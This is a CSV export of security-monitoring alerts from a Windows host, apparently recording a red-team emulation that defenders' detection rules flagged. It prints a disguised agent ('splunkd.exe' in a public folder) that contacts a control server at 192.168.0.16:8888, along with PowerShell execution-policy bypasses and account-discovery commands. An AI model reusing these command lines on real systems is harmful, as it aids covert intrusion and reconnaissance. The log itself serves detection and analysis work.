timestamp,agent.name,rule.id,rule.level,rule.description,data.win.system.channel,data.win.system.message
"Apr 26, 2025 @ 14:03:18.857","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:03:17.075\r\nProcessGuid: {26d71978-1fe5-680d-0805-000000000600}\r\nProcessId: 8416\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_ip0r05bl.qo4.ps1\r\nCreationUtcTime: 2025-04-26 18:03:17.075\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:02:22.785","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:02:21.046\r\nProcessGuid: {26d71978-1fac-680d-0705-000000000600}\r\nProcessId: 1680\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_lei1mjhx.oo3.ps1\r\nCreationUtcTime: 2025-04-26 18:02:21.041\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:01:24.812","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:01:23.008\r\nProcessGuid: {26d71978-1f72-680d-0505-000000000600}\r\nProcessId: 4964\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_3ecnfnjn.hqf.ps1\r\nCreationUtcTime: 2025-04-26 18:01:23.008\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 14:00:31.738","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 18:00:29.949\r\nProcessGuid: {26d71978-1f3d-680d-0405-000000000600}\r\nProcessId: 4936\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_nzwxcmk2.wp0.ps1\r\nCreationUtcTime: 2025-04-26 18:00:29.949\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:59:37.961","host1_windows1","92039","3","A net.exe account discovery command was initiated","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-04-26 17:59:36.035\r\nProcessGuid: {26d71978-1f08-680d-0305-000000000600}\r\nProcessId: 5172\r\nImage: C:\Windows\System32\net1.exe\r\nFileVersion: 10.0.26100.1150 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\WINDOWS\system32\net1 user usach /domain\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=EF2D271C7A297FD2CD003D50F67493B3F3AC2988,MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E\r\nParentProcessGuid: {26d71978-1f08-680d-0205-000000000600}\r\nParentProcessId: 1740\r\nParentImage: C:\Windows\System32\net.exe\r\nParentCommandLine: ""C:\WINDOWS\system32\net.exe"" user usach /domain\r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:59:37.900","host1_windows1","92033","3","Discovery activity spawned via powershell execution","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-04-26 17:59:36.025\r\nProcessGuid: {26d71978-1f08-680d-0205-000000000600}\r\nProcessId: 1740\r\nImage: C:\Windows\System32\net.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: ""C:\WINDOWS\system32\net.exe"" user usach /domain\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=22C5F27687496FEE69D97F499FB08592FE4AABD4,MD5=1BFB2C7C3B8BE001F5A346E5AA4A5C2D,SHA256=3BFE5126FA138291696C4551077D007650425B0BF399FD94363E9E9C7BE73ED5,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75\r\nParentProcessGuid: {26d71978-1f07-680d-0105-000000000600}\r\nParentProcessId: 1244\r\nParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""net user usach /domain""\r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:59:37.746","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:59:35.939\r\nProcessGuid: {26d71978-1f07-680d-0105-000000000600}\r\nProcessId: 1244\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_1cslug1g.oy0.ps1\r\nCreationUtcTime: 2025-04-26 17:59:35.939\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:58:46.708","host1_windows1","61109","5","Name resolution for the name wpad timed out","System","""La resolución de nombres para el nombre wpad agotó el tiempo de espera después de que ninguno de los servidores DNS configurados respondiera. PID de cliente 2516."""
"Apr 26, 2025 @ 13:58:37.888","host1_windows1","92031","3","Discovery activity executed","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-04-26 17:58:36.015\r\nProcessGuid: {26d71978-1ecc-680d-0005-000000000600}\r\nProcessId: 1048\r\nImage: C:\Windows\System32\net1.exe\r\nFileVersion: 10.0.26100.1150 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\WINDOWS\system32\net1 accounts\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=EF2D271C7A297FD2CD003D50F67493B3F3AC2988,MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E\r\nParentProcessGuid: {26d71978-1ecc-680d-ff04-000000000600}\r\nParentProcessId: 2304\r\nParentImage: C:\Windows\System32\net.exe\r\nParentCommandLine: ""C:\WINDOWS\system32\net.exe"" accounts\r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:58:37.827","host1_windows1","92033","3","Discovery activity spawned via powershell execution","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-04-26 17:58:36.004\r\nProcessGuid: {26d71978-1ecc-680d-ff04-000000000600}\r\nProcessId: 2304\r\nImage: C:\Windows\System32\net.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: ""C:\WINDOWS\system32\net.exe"" accounts\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=22C5F27687496FEE69D97F499FB08592FE4AABD4,MD5=1BFB2C7C3B8BE001F5A346E5AA4A5C2D,SHA256=3BFE5126FA138291696C4551077D007650425B0BF399FD94363E9E9C7BE73ED5,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75\r\nParentProcessGuid: {26d71978-1ecb-680d-fe04-000000000600}\r\nParentProcessId: 8408\r\nParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""net accounts""\r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:58:37.674","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:58:35.910\r\nProcessGuid: {26d71978-1ecb-680d-fe04-000000000600}\r\nProcessId: 8408\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_k3p2oxby.thq.ps1\r\nCreationUtcTime: 2025-04-26 17:58:35.910\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:58:01.238","host1_windows1","92910","12","Explorer process was accessed by C:\\WINDOWS\\system32\\tasklist.exe, possible process injection","Microsoft-Windows-Sysmon/Operational","""Process accessed:\r\nRuleName: technique_id=T1003,technique_name=Credential Dumping\r\nUtcTime: 2025-04-26 17:57:59.875\r\nSourceProcessGUID: {26d71978-1ea7-680d-fd04-000000000600}\r\nSourceProcessId: 10120\r\nSourceThreadId: 428\r\nSourceImage: C:\WINDOWS\system32\tasklist.exe\r\nTargetProcessGUID: {26d71978-fab1-680c-de00-000000000600}\r\nTargetProcessId: 5672\r\nTargetImage: C:\WINDOWS\Explorer.EXE\r\nGrantedAccess: 0x1FFFFF\r\nCallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+15f2c4|C:\WINDOWS\SYSTEM32\ntdll.dll+7201f|C:\WINDOWS\System32\dbghelp.dll+e3af|C:\WINDOWS\System32\dbghelp.dll+e310|C:\WINDOWS\system32\tasklist.exe+46fb|C:\WINDOWS\system32\tasklist.exe+53cb|C:\WINDOWS\system32\tasklist.exe+4f3e|C:\WINDOWS\system32\tasklist.exe+64dc|C:\WINDOWS\system32\tasklist.exe+7afc|C:\WINDOWS\system32\tasklist.exe+12d4|C:\WINDOWS\System32\KERNEL32.DLL+2dbe7|C:\WINDOWS\SYSTEM32\ntdll.dll+85a6c\r\nSourceUser: DESKTOP-V0J3BBT\usach\r\nTargetUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:58:00.093","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:57:58.909\r\nProcessGuid: {26d71978-1ea6-680d-fc04-000000000600}\r\nProcessId: 2488\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_havqpuns.lax.ps1\r\nCreationUtcTime: 2025-04-26 17:57:58.909\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:57:40.205","host1_windows1","92154","4","Process loaded taskschd.dll module. May be used to create delayed malware execution","Microsoft-Windows-Sysmon/Operational","""Image loaded:\r\nRuleName: technique_id=T1053,technique_name=Scheduled Task\r\nUtcTime: 2025-04-26 17:57:39.093\r\nProcessGuid: {26d71978-1e92-680d-fb04-000000000600}\r\nProcessId: 9672\r\nImage: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe\r\nImageLoaded: C:\Windows\SysWOW64\taskschd.dll\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Task Scheduler COM API\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: taskschd.dll\r\nHashes: SHA1=894727CF3D1923CB2E3A3F93A20BFF54B28CAD26,MD5=E03BAB1E04309BD3918365DFAFF5F85B,SHA256=8ED3C82873392BDA0377E617BBFF18B2C340FEDA9AAA9A886112CE2057635CD0,IMPHASH=86234BA1ECC097DF8302B1B6731097FD\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: NT AUTHORITY\SYSTEM"""
"Apr 26, 2025 @ 13:57:40.161","host1_windows1","92154","4","Process loaded taskschd.dll module. May be used to create delayed malware execution","Microsoft-Windows-Sysmon/Operational","""Image loaded:\r\nRuleName: technique_id=T1053,technique_name=Scheduled Task\r\nUtcTime: 2025-04-26 17:57:38.717\r\nProcessGuid: {26d71978-1e92-680d-fa04-000000000600}\r\nProcessId: 4528\r\nImage: C:\Program Files (x86)\Microsoft\EdgeUpdate\MicrosoftEdgeUpdate.exe\r\nImageLoaded: C:\Windows\SysWOW64\taskschd.dll\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Task Scheduler COM API\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: taskschd.dll\r\nHashes: SHA1=894727CF3D1923CB2E3A3F93A20BFF54B28CAD26,MD5=E03BAB1E04309BD3918365DFAFF5F85B,SHA256=8ED3C82873392BDA0377E617BBFF18B2C340FEDA9AAA9A886112CE2057635CD0,IMPHASH=86234BA1ECC097DF8302B1B6731097FD\r\nSigned: true\r\nSignature: Microsoft Windows\r\nSignatureStatus: Valid\r\nUser: NT AUTHORITY\SYSTEM"""
"Apr 26, 2025 @ 13:57:24.651","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:57:22.860\r\nProcessGuid: {26d71978-1e82-680d-f804-000000000600}\r\nProcessId: 5188\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_dehx4yna.zfe.ps1\r\nCreationUtcTime: 2025-04-26 17:57:22.860\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:56:43.570","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:56:41.782\r\nProcessGuid: {26d71978-1e59-680d-f704-000000000600}\r\nProcessId: 264\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_3oq5kc0m.yh0.ps1\r\nCreationUtcTime: 2025-04-26 17:56:41.782\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:56:16.346","host1_windows1","60106","3","Windows Logon Success","Security","""Se inició sesión correctamente en una cuenta.\r\n\r\nFirmante:\r\n	Id. de seguridad:		S-1-5-18\r\n	Nombre de cuenta:		DESKTOP-V0J3BBT$\r\n	Dominio de cuenta:		WORKGROUP\r\n	Id. de inicio de sesión:		0x3E7\r\n\r\nInformación de inicio de sesión:\r\n	Tipo de inicio de sesión:		5\r\n	Modo de administrador restringido:	-\r\n	Credential Guard remota:	-\r\n	Cuenta virtual:		No\r\n	Token elevado:		Sí\r\n\r\nNivel de suplantación:		Suplantación\r\n\r\nNuevo inicio de sesión:\r\n	Id. de seguridad:		S-1-5-18\r\n	Nombre de cuenta:		SYSTEM\r\n	Dominio de cuenta:		NT AUTHORITY\r\n	Id. de inicio de sesión:		0x3E7\r\n	Inicio de sesión vinculado:		0x0\r\n	Nombre de cuenta de red:	-\r\n	Dominio de cuenta de red:	-\r\n	GUID de inicio de sesión:		{00000000-0000-0000-0000-000000000000}\r\n\r\nInformación de proceso:\r\n	Id. de proceso:		0x33c\r\n	Nombre de proceso:		C:\Windows\System32\services.exe\r\n\r\nInformación de red:\r\n	Nombre de estación de trabajo:	-\r\n	Dirección de red de origen:	-\r\n	Puerto de origen:		-\r\n\r\nInformación de autenticación detallada:\r\n	Proceso de inicio de sesión:		Advapi  \r\n	Paquete de autenticación:	Negotiate\r\n	Servicios transitados:	-\r\n	Nombre de paquete (solo NTLM):	-\r\n	Longitud de clave:		0\r\n\r\nEste evento se genera cuando se crea una sesión de inicio. Lo genera el equipo al que se tuvo acceso.\r\n\r\nLos campos de firmante indican la cuenta del sistema local que solicitó el inicio de sesión. Suele ser un servicio como el servicio de servidor o un proceso local como Winlogon.exe o Services.exe.\r\n\r\nEl campo Tipo de inicio de sesión indica la clase de inicio de sesión que se realizó. Los tipos más comunes son 2 (interactivo) y 3 (red).\r\n\r\nLos campos Nuevo inicio de sesión indican la cuenta para la que se creó el nuevo inicio de sesión, es decir, aquella en la que se inició la sesión.\r\n\r\nLos campos de red indican dónde se originó una solicitud de inicio de sesión remota. Nombre de estación de trabajo no está siempre disponible y se puede dejar en blanco en algunos casos.\r\n\r\nEl campo de nivel de suplantación indica en qué medida un proceso en la sesión de inicio de sesión puede suplantar.\r\n\r\nLos campos de información de autenticación proporcionan información detallada sobre esta solicitud de inicio de sesión específica.\r\n	- GUID de inicio de sesión es un identificador único que se puede usar para correlacionar este evento con un evento KDC.\r\n	- Servicios transitados indica los servicios intermedios que participaron en esta solicitud de inicio de sesión.\r\n	- Nombre de paquete indica el subprotocolo que se usó entre los protocolos NTLM.\r\n	- Longitud de clave indica la longitud de la clave de sesión generada. Será 0 si no se solicitó una clave de sesión."""
"Apr 26, 2025 @ 13:56:08.173","host1_windows1","92910","12","Explorer process was accessed by C:\\Users\\usach\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe, possible process injection","Microsoft-Windows-Sysmon/Operational","""Process accessed:\r\nRuleName: technique_id=T1036,technique_name=Masquerading\r\nUtcTime: 2025-04-26 17:56:07.457\r\nSourceProcessGUID: {26d71978-fac7-680c-1201-000000000600}\r\nSourceProcessId: 9004\r\nSourceThreadId: 3408\r\nSourceImage: C:\Users\usach\AppData\Local\Microsoft\OneDrive\OneDrive.exe\r\nTargetProcessGUID: {26d71978-fab1-680c-de00-000000000600}\r\nTargetProcessId: 5672\r\nTargetImage: C:\WINDOWS\Explorer.EXE\r\nGrantedAccess: 0x101411\r\nCallTrace: C:\WINDOWS\SYSTEM32\ntdll.dll+15f2c4|C:\WINDOWS\System32\KERNELBASE.dll+c4766|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncClient.dll+5e4891|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncClient.dll+8a756|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncClient.dll+8a4c7|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncClient.dll+8a3b6|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncEvents.dll+edf1|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncHost.DLL+d765|C:\Users\usach\AppData\Local\Microsoft\OneDrive\25.056.0324.0003\FileSyncHost.DLL+ff35|C:\WINDOWS\System32\ucrtbase.dll+14ea0|C:\WINDOWS\System32\KERNEL32.DLL+2dbe7|C:\WINDOWS\SYSTEM32\ntdll.dll+85a6c\r\nSourceUser: DESKTOP-V0J3BBT\usach\r\nTargetUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:56:06.517","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:56:04.727\r\nProcessGuid: {26d71978-1e34-680d-f504-000000000600}\r\nProcessId: 6780\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_5rcgcaue.1ry.ps1\r\nCreationUtcTime: 2025-04-26 17:56:04.727\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:55:04.435","host1_windows1","92213","15","Executable file dropped in folder commonly used by malware","Microsoft-Windows-Sysmon/Operational","""File created:\r\nRuleName: technique_id=T1059.001,technique_name=PowerShell\r\nUtcTime: 2025-04-26 17:55:02.731\r\nProcessGuid: {26d71978-1df6-680d-f304-000000000600}\r\nProcessId: 2148\r\nImage: C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe\r\nTargetFilename: C:\Users\usach\AppData\Local\Temp\__PSScriptPolicyTest_zwjiwkny.pjl.ps1\r\nCreationUtcTime: 2025-04-26 17:55:02.731\r\nUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:54:14.296","host1_windows1","92039","3","A net.exe account discovery command was initiated","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-04-26 17:54:12.621\r\nProcessGuid: {26d71978-1dc4-680d-f204-000000000600}\r\nProcessId: 9168\r\nImage: C:\Windows\System32\net1.exe\r\nFileVersion: 10.0.26100.1150 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net1.exe\r\nCommandLine: C:\WINDOWS\system32\net1  user /domain\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=EF2D271C7A297FD2CD003D50F67493B3F3AC2988,MD5=12293EDB07AB8B4D92BAF4BEBFD7A9D8,SHA256=15E3429ECCE48FC6AB66371D040F4C40FB961F2CED4C7D40942279B19DEFE8C7,IMPHASH=98A56655C7E54BCE7F55B3F01AB5B07E\r\nParentProcessGuid: {26d71978-1dc4-680d-f104-000000000600}\r\nParentProcessId: 9744\r\nParentImage: C:\Windows\System32\net.exe\r\nParentCommandLine: net  user /domain\r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:54:14.279","host1_windows1","92036","3","A C:\\Windows\\System32\\net.exe binary was started by a Windows cmd shell","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1018,technique_name=Remote System Discovery\r\nUtcTime: 2025-04-26 17:54:12.610\r\nProcessGuid: {26d71978-1dc4-680d-f104-000000000600}\r\nProcessId: 9744\r\nImage: C:\Windows\System32\net.exe\r\nFileVersion: 10.0.26100.1 (WinBuild.160101.0800)\r\nDescription: Net Command\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: net.exe\r\nCommandLine: net  user /domain\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=22C5F27687496FEE69D97F499FB08592FE4AABD4,MD5=1BFB2C7C3B8BE001F5A346E5AA4A5C2D,SHA256=3BFE5126FA138291696C4551077D007650425B0BF399FD94363E9E9C7BE73ED5,IMPHASH=EF46B86C2346DA0A991DE4B78AAF4E75\r\nParentProcessGuid: {26d71978-1dc4-680d-f004-000000000600}\r\nParentProcessId: 3764\r\nParentImage: C:\Windows\System32\cmd.exe\r\nParentCommandLine: cmd.exe /C net user /domain\r\nParentUser: DESKTOP-V0J3BBT\usach"""
"Apr 26, 2025 @ 13:54:14.234","host1_windows1","92052","4","Windows command prompt started by an abnormal process","Microsoft-Windows-Sysmon/Operational","""Process Create:\r\nRuleName: technique_id=T1087.001,technique_name=Local Account\r\nUtcTime: 2025-04-26 17:54:12.598\r\nProcessGuid: {26d71978-1dc4-680d-f004-000000000600}\r\nProcessId: 3764\r\nImage: C:\Windows\System32\cmd.exe\r\nFileVersion: 10.0.26100.1591 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe /C net user /domain\r\nCurrentDirectory: C:\Users\usach\\r\nUser: DESKTOP-V0J3BBT\usach\r\nLogonGuid: {26d71978-fab0-680c-e1c4-0c0000000000}\r\nLogonId: 0xCC4E1\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=6045CA4D0E30D7397A077DD8E070F2EB11DC32C0,MD5=B63148610EB6310740000DC856FE837A,SHA256=486AA8AC1661C0DC08D3EBEA4F25F0009D248F2CED111DEA8587C2B7D71B49BB,IMPHASH=05CB934E42838CA78A9F01D367E81539\r\nParentProcessGuid: {26d71978-fd2a-680c-7401-000000000600}\r\nParentProcessId: 5720\r\nParentImage: C:\Users\Public\splunkd.exe\r\nParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://192.168.0.16:8888 -group red \r\nParentUser: DESKTOP-V0J3BBT\usach"""
